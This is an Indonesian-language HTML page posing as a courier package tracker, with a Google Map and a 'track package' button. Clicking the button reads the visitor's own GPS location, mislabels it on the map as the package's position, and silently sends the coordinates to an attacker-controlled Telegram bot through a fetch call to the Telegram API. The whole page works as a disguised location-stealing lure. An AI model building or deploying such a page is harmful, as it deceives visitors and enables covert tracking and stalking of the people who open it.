

<!DOCTYPE html>
<html>
<head>
   <title>Melacak Lokasi Paket Kurir</title>
   <style>
       body {
           font-family: Arial, sans-serif;
           background-image: url('kurir_background.jpg');
           background-size: cover;
           background-repeat: no-repeat;
           background-attachment: fixed;
           display: flex;
           justify-content: center;
           align-items: center;
           height: 100vh;
           margin: 0;
           color: white;
           text-align: center;
       }
       #map {
           width: 80%;
           height: 80%;
           border: 2px solid white;
           box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
       }
       #trackButton {
           margin-top: 20px;
           padding: 10px 20px;
           font-size: 18px;
           cursor: pointer;
           background-color: #3498db;
           color: white;
           border: none;
           border-radius: 5px;
       }
       #trackButton:hover {
           background-color: #2980b9;
       }
   </style>
</head>
<body>
   <div>
       <div id="map"></div>
       <button id="trackButton">Lacak Lokasi Paket</button>
   </div>
   <script>
       var map;
       var marker;
       var infoWindow;

       function initMap() {
           map = new google.maps.Map(document.getElementById('map'), {
               center: {lat: -6.200000, lng: 106.816666},
               zoom: 14
           });
           infoWindow = new google.maps.InfoWindow();
       }

       document.getElementById('trackButton').addEventListener('click', function() {
           if (navigator.geolocation) {
               navigator.geolocation.getCurrentPosition(function(position) {
                   var pos = {
                       lat: position.coords.latitude,
                       lng: position.coords.longitude
                   };

                   if (marker) {
                       marker.setPosition(pos);
                   } else {
                       marker = new google.maps.Marker({
                           position: pos,
                           map: map,
                           title: 'Lokasi Paket'
                       });
                   }

                   map.setCenter(pos);
                   map.setZoom(14);

                   var content = 'Lokasi paket saat ini: Latitude ' + pos.lat + ', Longitude ' + pos.lng;
                   infoWindow.setContent(content);
                   infoWindow.open(map, marker);

                   // Kirim lokasi ke Telegram bot
                   var botToken = 'YOUR_BOT_TOKEN';
                   var chatId = 'YOUR_CHAT_ID';
                   var message = 'Lokasi paket saat ini: Latitude ' + pos.lat + ', Longitude ' + pos.lng;

                   fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
                       method: 'POST',
                       headers: {
                           'Content-Type': 'application/json'
                       },
                       body: JSON.stringify({
                           chat_id: chatId,
                           text: message
                       })
                   });
               }, function(error) {
                   alert('Terjadi kesalahan: ' + error.message);
               });
           } else {
               alert('Browser Anda tidak mendukung GeoLocation API.');
           }
       });
   </script>
   <script async defer src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&callback=initMap"></script>
</body>
</html>
